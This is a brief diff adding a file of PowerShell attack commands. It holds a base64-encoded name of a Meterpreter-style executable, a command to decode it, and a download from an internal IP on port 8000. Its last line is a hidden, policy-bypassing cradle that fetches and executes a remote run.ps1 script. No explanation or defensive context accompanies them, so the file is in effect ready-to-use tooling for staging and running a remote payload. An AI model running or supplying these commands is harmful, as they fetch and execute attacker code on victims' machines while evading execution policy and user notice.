@@ -1,0 +1,13 @@
+bWV0ZXIuZXhlCg==
+
+
+
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWV0ZXIuZXhlCg=="))
+
+
+
+
+powershell -c "Invoke-WebRequest -Uri http://172.22.238.168:8000/ -OutFile "
+
+
+powershell -nop -exec bypass -w hidden -c "iex(New-Object Net.WebClient).DownloadString('http://172.22.238.168:8000/run.ps1')"
